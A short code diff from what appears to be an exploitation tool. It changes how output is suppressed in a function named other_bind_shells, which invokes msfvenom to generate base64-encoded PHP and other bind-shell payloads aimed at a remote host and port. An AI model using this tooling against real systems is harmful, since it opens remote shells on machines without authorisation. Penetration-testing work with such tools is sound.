@@ -121,7 +121,7 @@ def other_bind_shells(separator):
         proc = subprocess.Popen("msfvenom -p " + str(payload) +
           " RHOST=" + str(settings.RHOST) +
           " LPORT=" + str(settings.LPORT) +
-          " -e php/base64 -o " + output + ">/dev/null 2>&1", shell=True).wait()
+          " -e php/base64 -o " + output + settings.NO_OUTPUT, shell=True).wait()
 
         with open (output, "r+") as content_file:
           data = content_file.readlines()
@@ -212,7 +212,7 @@ def other_bind_shells(separator):
         proc = subprocess.Popen("msfvenom -p " + str(payload) +
           " RHOST=" + str(settings.RHOST) +
           " LPORT=" + str(settings.LPORT) +
-          " -e php/base64 -o " + output + ">/dev/null 2>&1", shell=True).wait()
+          " -e php/base64 -o " + output + settings.NO_OUTPUT, shell=True).wait()
 
         with open (output, "r+") as content_file:
           data = content_file.readlines()
@@ -256,7 +256,7 @@ def other_bind_shells(separator):
         proc = subprocess.Popen("msfvenom -p " + str(payload) +
           " RHOST=" + str(settings.RHOST) +
           " LPORT=" + str(settings.LPORT) +
-          " -o " + output + ">/dev/null 2>&1", shell=True).wait()
+          " -o " + output + settings.NO_OUTPUT, shell=True).wait()
 
         with open (output, "r") as content_file:
           data = content_file.readlines()
